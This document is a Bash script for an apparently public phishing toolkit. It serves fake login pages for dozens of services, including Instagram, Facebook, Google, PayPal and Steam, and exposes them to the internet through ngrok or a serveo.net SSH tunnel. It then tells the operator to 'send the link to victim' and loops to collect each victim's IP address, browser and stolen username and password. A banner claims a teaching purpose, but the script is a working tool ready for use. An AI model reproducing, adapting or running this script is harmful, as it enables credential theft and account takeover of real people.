#!/bin/bash
trap 'printf "\n";stop;exit 1' 2
deps() {
command -v php > /dev/null 2>&1 || { echo >&2 "PHP is not installed ! Install it."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "Curl is not installed ! Install it."; exit 1; }
command -v ssh > /dev/null 2>&1 || { echo >&2 "Openssh is not installed ! Install it"; exit 1; }
command -v unzip > /dev/null 2>&1 || { echo >&2 "Unzip is not installed ! Install it"; exit 1; }
}
banner(){
clear
 
printf "\e[1;31m _______ _             _     \e[0m\n"
printf "\e[1;31m|__   __(_)           | |     \e[0m\n"
printf "\e[1;31m   | |   _ _ __   __ _| | ___ \e[0m\n"
printf "\e[1;31m   | |  | |  _ \ / _  | |/ _ \ \e[0m\n"
printf "\e[1;30m   | |  | | | | | (_| | |  __/ \e[0m\n"
printf "\e[1;30m   |_|  |_|_| |_|\__, |_|\___| \e[0m\n"
printf "\e[1;30m                  __/ |       \e[0m\n"
printf "\e[1;30m                 |___/        \e[0m\n"
printf "\e[1;33m___________________________________________________________\e[0m\n"
printf "\e[1;33mᴛʜɪs ᴛᴏᴏʟ ɪs ᴏɴʟʏ ᴅᴇᴠᴇʟᴏᴘᴇᴅ ғᴏʀ ᴀ ɢᴏᴏᴅ ᴘᴜʀᴘᴏsᴇ ʟɪᴋᴇ \e[0m\n"
printf "\e[1;33mᴛᴇᴀᴄʜɪɴɢ sᴏᴍᴇᴏɴᴇ.sᴏ ᴘʟᴇᴀsᴇ ᴅᴏɴ'ᴛ ᴜsᴇ ɪᴛ ғᴏʀ ᴀɴʏ ɪʟʟᴇɢᴀʟ\e[0m\n"
printf "\e[1;33mᴜsᴇ :) \e[0m\n"   
printf "\e[1;33m___________________________________________________________\e[0m\n"    
printf " \n"
}
menu() {
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;92m Instagram   \e[0m\e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;92m Twitch     \e[0m\e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;92mDeviantArt\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;92m Facebook    \e[0m\e[1;31m[\e[0m\e[1;77m05\e[0m\e[1;31m]\e[0m\e[1;92m Pinterest  \e[0m\e[1;31m[\e[0m\e[1;77m06\e[0m\e[1;31m]\e[0m\e[1;92m Badoo\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m07\e[0m\e[1;31m]\e[0m\e[1;92m Google      \e[0m\e[1;31m[\e[0m\e[1;77m08\e[0m\e[1;31m]\e[0m\e[1;92m Snapchat   \e[0m\e[1;31m[\e[0m\e[1;77m09\e[0m\e[1;31m]\e[0m\e[1;92m Origin\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m10\e[0m\e[1;31m]\e[0m\e[1;92m Microsoft   \e[0m\e[1;31m[\e[0m\e[1;77m11\e[0m\e[1;31m]\e[0m\e[1;92m Linkedin   \e[0m\e[1;31m[\e[0m\e[1;77m12\e[0m\e[1;31m]\e[0m\e[1;92m CryptoCoin\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m13\e[0m\e[1;31m]\e[0m\e[1;92m Netflix     \e[0m\e[1;31m[\e[0m\e[1;77m14\e[0m\e[1;31m]\e[0m\e[1;92m Ebay       \e[0m\e[1;31m[\e[0m\e[1;77m15\e[0m\e[1;31m]\e[0m\e[1;92m Yahoo\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m16\e[0m\e[1;31m]\e[0m\e[1;92m Github      \e[0m\e[1;31m[\e[0m\e[1;77m17\e[0m\e[1;31m]\e[0m\e[1;92m Dropbox    \e[0m\e[1;31m[\e[0m\e[1;77m18\e[0m\e[1;31m]\e[0m\e[1;92m Wordpress\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m19\e[0m\e[1;31m]\e[0m\e[1;92m Steam       \e[0m\e[1;31m[\e[0m\e[1;77m20\e[0m\e[1;31m]\e[0m\e[1;92m Protonmail \e[0m\e[1;31m[\e[0m\e[1;77m21\e[0m\e[1;31m]\e[0m\e[1;92m Yandex\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m22\e[0m\e[1;31m]\e[0m\e[1;92m Twitter     \e[0m\e[1;31m[\e[0m\e[1;77m23\e[0m\e[1;31m]\e[0m\e[1;92m Spotify    \e[0m\e[1;31m[\e[0m\e[1;77m24\e[0m\e[1;31m]\e[0m\e[1;92mStackoverFlow\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m25\e[0m\e[1;31m]\e[0m\e[1;92m Playstation \e[0m\e[1;31m[\e[0m\e[1;77m26\e[0m\e[1;31m]\e[0m\e[1;92m Reddit     \e[0m\e[1;31m[\e[0m\e[1;77m27\e[0m\e[1;31m]\e[0m\e[1;92m Custom\e[0m\n"    
printf " \e[1;31m[\e[0m\e[1;77m28\e[0m\e[1;31m]\e[0m\e[1;92m Paypal      \e[0m\e[1;31m[\e[0m\e[1;77m29\e[0m\e[1;31m]\e[0m\e[1;92m Adobe      \e[0m\e[1;31m[\e[0m\e[1;77m30\e[0m\e[1;31m]\e[0m\e[1;92m Vk\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m31\e[0m\e[1;31m]\e[0m\e[1;92m Wifi   	  \e[0m\e[1;31m[\e[0m\e[1;77m32\e[0m\e[1;31m]\e[0m\e[1;92m Apple      \e[0m\e[1;31m[\e[0m\e[1;77m33\e[0m\e[1;31m]\e[0m\e[1;92m Amazon\e[0m\n"  
printf " \e[1;31m[\e[0m\e[1;77m34\e[0m\e[1;31m]\e[0m\e[1;92m Bitcoin	  \e[0m\e[1;31m[\e[0m\e[1;77m35\e[0m\e[1;31m]\e[0m\e[1;92m icloud     \e[0m\e[1;31m[\e[0m\e[1;77m36\e[0m\e[1;31m]\e[0m\e[1;92m MySpace\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m37\e[0m\e[1;31m]\e[0m\e[1;92m Gitlab      \e[0m\e[1;31m[\e[0m\e[1;77m38\e[0m\e[1;31m]\e[0m\e[1;92m Xbox       \e[0m\e[1;31m[\e[0m\e[1;77m39\e[0m\e[1;31m]\e[0m\e[1;92m Help\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;89m Select an option: \e[0m\e[1;96m\en' option
if [[ $option == 1 || $option == 01 ]]; then
instagram
elif [[ $option == 2 || $option == 02 ]]; then
server="twitch"
start            
elif [[ $option == 3 || $option == 03 ]]; then
server="deviantart"
start                
elif [[ $option == 4 || $option == 04 ]]; then
facebook
start
elif [[ $option == 5 || $option == 05 ]]; then
server="pinterest"
start
elif [[ $option == 6 || $option == 06 ]]; then
server="badoo"
start
elif [[ $option == 7 || $option == 07 ]]; then
google
elif [[ $option == 8 || $option == 08 ]]; then
server="snapchat"
start
elif [[ $option == 9 || $option == 09 ]]; then
server="origin"
start
elif [[ $option == 10 ]]; then
server="microsoft"
start
elif [[ $option == 11 ]]; then
server="linkedin"
start
elif [[ $option == 12 ]]; then
server="cryptocoinsniper"
start
elif [[ $option == 13 ]]; then
server="netflix"
start
elif [[ $option == 14 ]]; then
server="ebay"
start
elif [[ $option == 15 ]]; then
server="yahoo"
start
elif [[ $option == 16 ]]; then
server="github"
start
elif [[ $option == 17 ]]; then
server="dropbox"
start
elif [[ $option == 18 ]]; then
server="wordpress"
start
elif [[ $option == 19 ]]; then
server="steam"
start
elif [[ $option == 20 ]]; then
server="protonmail"
start
elif [[ $option == 21 ]]; then
server="yandex"
start
elif [[ $option == 22 ]]; then
server="twitter"
start
elif [[ $option == 23 ]]; then
server="spotify"
start
elif [[ $option == 24 ]]; then
server="stackoverflow"
start
elif [[ $option == 25 ]]; then
server="playstation"
start
elif [[ $option == 26 ]]; then
server="reddit"
start
elif [[ $option == 27 ]]; then
custom
elif [[ $option == 28 ]]; then
server="paypal"
start
elif [[ $option == 29 ]]; then
server="adobe"
start                                                                                                                        
elif [[ $option == 30 ]]; then
vk
elif [[ $option == 31 ]]; then
server="wifi"
start                                                                                                                               
elif [[ $option == 32 ]]; then
server="apple"
start
elif [[ $option == 33 ]]; then
server="amazon"
start
elif [[ $option == 34 ]]; then
server="bitcoin"
start                           
elif [[ $option == 35 ]]; then
server="icloud"
start
elif [[ $option == 36 ]]; then
server="myspace"
start
elif [[ $option == 37 ]]; then
server="gitlab"
start
elif [[ $option == 38 ]]; then
server="xbox"
start                                                                                                                                                        
elif [[ $option == 39 ]]; then
help                                                                                                                                                       
elif [[ $option == X || $option == x ]]; then
exit 1
else
printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi
}
facebook(){
printf " \n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Advanced Voting Poll Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Fake Security Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m Facebook Messenger Login Page\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' option
if [[ $option == 1 || $option == 01 ]]; then
server="facebook"
start
elif [[ $option == 2 || $option == 02 ]]; then
server="fb_advanced"
start
elif [[ $option == 3 || $option == 03 ]]; then
server="fb_security"
start
elif [[ $option == 4 || $option == 04 ]]; then
server="fb_messenger"
start
else
printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi
}
help(){
clear
printf "\e[0m\e[1;30m \e[0m\n"                                                                                                                                                                                
printf "\e[0m\e[1;39m If you are facing any error or any issue please contact me on Instagram or YouTube. \e[0m\n"
printf "\e[0m\n"
printf "\e[0m\e[4;34m Created by Tech Blender \e[0m\n"
printf "\e[0m\n"
printf "\e[0m\e[90m  GITHUB \e[0m\e[37m   : \e[0m\e[93mhttps://github.com/techblender\e[0m\n"
printf "\e[0m\n"
printf "\e[0m\e[31m  Youtube \e[0m\e[37m  : \e[0m\e[93mhttps://www.youtube.com/c/TechBlenderOfficial\e[0m\n"
printf "\e[0m\n"
printf "\e[0m\e[95m  Instagram\e[0m\e[37m : \e[0m\e[93mhttps://www.instagram.com/techblender\e[0m\n"
printf "\e[0m\n"
printf "\e[0m\e[39m ᑭᒪEᗩＳE ᖴEEᒪ ᖴᖇEE TO ᑕOᑎTᗩᑕT ᗰE Iᖴ YOᑌ ᑎEEᗪ ᗩᑎY ᕼEᒪᑭ :) \e[0m\n"
printf "\e[0m\n"
printf "\e[0m\n"
sleep 0.5
printf " \e[0m\e[91m[\e[0m01\e[0m\e[91m]\e[0m\e[92m Back           \e[0m\e[91m[\e[0m02\e[0m\e[91m]\e[0m\e[92m Exit\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' about_option

if [[ $about_option == 01 || $about_option == 1 ]]; then
sleep 1
banner
menu
elif [[ $about_option == 02 || $about_option == 2 ]]; then
sleep 1
printf "\e[0m\n"
printf " \e[0m\e[2;39m Ｂｙｅ Ｂｙｅ !!! ＧＬＡＤ ＴＯ ＳＥＥ ＹＯＵ ＡＧＡＩＮ :) \e[0m\n"
printf "\e[0m\n"
exit 1

else
printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi
}
instagram(){
printf " \n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Auto Followers Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Blue Badge Verify Login Page\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' option
if [[ $option == 1 || $option == 01 ]]; then
server="instagram"
start
elif [[ $option == 2 || $option == 02 ]]; then
server="ig_followers"
start
elif [[ $option == 3 || $option == 03 ]]; then
server="ig_verify"
start
else
printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi
}
google(){
printf " \n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Google Old Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Google New Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Advanced Voting Poll\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' option
if [[ $option == 1 || $option == 01 ]]; then
server="google"
start
elif [[ $option == 2 || $option == 02 ]]; then
server="google_new"
start
elif [[ $option == 3 || $option == 03 ]]; then
server="google_poll"
start
else
printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi
}
custom(){
                                                                                                                                                                        
server="custom"
createpage
start
}

vk(){

printf " \n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Advanced Voting Poll Login Page\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' vk_option

if [[ $vk_option == 1 || $vk_option == 01 ]]; then
server="vk"
start
elif [[ $vk_option == 2 || $vk_option == 02 ]]; then
server="vk_poll"
start

else
printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}

stop() {
checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
pkill -f -2 ssh > /dev/null 2>&1
killall ssh > /dev/null 2>&1
fi
if [[ -e linksender ]]; then
rm -rf linksender
fi
}
start() {
if [[ -e linksender ]]; then
rm -rf linksender
fi
printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;92m LocalHost\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;92m Ngrok.io\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;92m Serveo.net\e[0m\n"

d_o_server="2"
printf "\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;89m Select a Port Forwarding option: \e[0m\e[1;96m\en' option_server
option_server="${option_server:-${d_o_server}}"
if [[ $option_server == 3 || $option_server == 03 ]]; then
start_s
elif [[ $option_server == 2 || $option_server == 02 ]]; then
start_n
elif [[ $option_server == 1 || $option_server == 01 ]]; then
start_l
else
printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
start
fi
}
start_s() {
if [[ -e websites/$server/ip.txt ]]; then
rm -rf websites/$server/ip.txt
fi
if [[ -e websites/$server/usernames.txt ]]; then
rm -rf websites/$server/usernames.txt
fi
def_port="5555"
printf "\e[0m\n"
printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $def_port
read port
port="${port:-${def_port}}"
start_serveo
}
createpage() {
default_cap1="Title of Webpage"
default_cap2="Login Page"
default_user_text="Username:"                                                                                                                                                                                                                                    
default_pass_text="Password"
default_sub_text="Login/Submit"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 1 (Main title of Webpage): \e[0m' cap1
cap1="${cap1:-${default_cap1}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 2 (Second Title): \e[0m' cap2
cap2="${cap2:-${default_cap2}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Username field (Default: Username:): \e[0m' user_text
user_text="${user_text:-${default_user_text}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Password field (Default: Password:): \e[0m' pass_text
pass_text="${pass_text:-${default_pass_text}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Submit field (Default button:Log-In): \e[0m' sub_text
sub_text="${sub_text:-${default_sub_text}}"

echo "<!DOCTYPE html>" > websites/custom/login.html
echo "<html>" >> websites/custom/login.html
echo "<body bgcolor=\"black\" text=\"white\">" >> websites/custom/login.html
IFS=$'\n'
printf '<center><h2> %s <br><br> %s </h2></center><center>\n' $cap1 $cap2 >> websites/custom/login.html
IFS=$'\n'
printf '<form method="POST" action="login.php"><label>%s </label>\n' $user_text >> websites/custom/login.html
IFS=$'\n'
printf '<input type="text" name="username" length=64>\n' >> websites/custom/login.html
IFS=$'\n'
printf '<br><label>%s: </label>' $pass_text >> websites/custom/login.html
IFS=$'\n'
printf '<input type="password" name="password" length=64><br><br>\n' >> websites/custom/login.html
IFS=$'\n'
printf '<input value="%s" type="submit"></form>\n' $sub_text >> websites/custom/login.html
printf '</center>' >> websites/custom/login.html
printf '<body>\n' >> websites/custom/login.html
printf '</html>\n' >> websites/custom/login.html


}

start_serveo() {
printf "\e[0m\n"
printf "\e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:$port\e[0m\e[1;92m)\e[0m\n"
cd websites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
sleep 2
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Serveo ..\e[0m\n"
if [[ -e linksender ]]; then
rm -rf linksender
fi
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > linksender ' &
printf "\n"
sleep 7
send_url=$(grep -o "https://[0-9a-z]*\.serveo.net" linksender)
printf "\n"
printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n' $send_url
printf "\n"
found
}
start_n() {
if [[ -e websites/$server/ip.txt ]]; then
rm -rf websites/$server/ip.txt
fi
if [[ -e websites/$server/usernames.txt ]]; then
rm -rf websites/$server/usernames.txt
fi
if [[ -e ngrok ]]; then
echo ""
else
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:5555\e[0m\e[1;92m)\e[0m\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
curl -LO https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf " \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Please Install All Packges.\e[0m\n"
exit 1
fi
else
curl -LO https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf " \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Please Install All Packges.\e[0m\n"
exit 1
fi
fi
fi
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Ngrok ..\e[0m\n"
cd websites/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 &
sleep 2
./ngrok http 5555 > /dev/null 2>&1 &
sleep 10
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $link
found
}


start_l() {
def_port="5555"
printf "\e[0m\n"
printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $def_port
read port
port="${port:-${def_port}}"
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:$port\e[0m\e[1;92m)\e[0m\n"
cd websites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
sleep 2
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Successfully Hosted at :\e[0m\e[1;93m http://localhost:$port\e[0m\n"
printf "\n"
found
}
found() {
printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Login Info,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"
printf "\n"
while [ true ]; do
if [[ -e "websites/$server/ip.txt" ]]; then
printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP Found!\n"
printf "\n"
c_ip
rm -rf websites/$server/ip.txt
fi
sleep 0.75
if [[ -e "websites/$server/usernames.txt" ]]; then
printf " \e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;92m Login info Found !!\n"
printf "\n"
c_cred
rm -rf websites/$server/usernames.txt
fi
sleep 0.75
done
}
c_ip() {
touch websites/$server/login_info.txt
ip=$(grep -a 'IP:' websites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' websites/$server/ip.txt | cut -d '"' -f2)
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP:\e[0m\e[1;96m %s\e[0m\n" $ip
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m websites/%s/victim_ip.txt\e[0m\n" $server
printf "\n"
cat websites/$server/ip.txt >> websites/$server/victim_ip.txt
}
c_cred() {
account=$(grep -o 'Username:.*' websites/$server/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' websites/$server/usernames.txt | cut -d ":" -f2)
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Account:\e[0m\e[1;96m %s\n\e[0m" $account
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Password:\e[0m\e[1;96m %s\n\e[0m" $password
cat websites/$server/usernames.txt >> websites/$server/login_info.txt
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m websites/%s/login_info.txt\e[0m\n" $server
printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Next Login Info,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"
}
banner
deps
menu
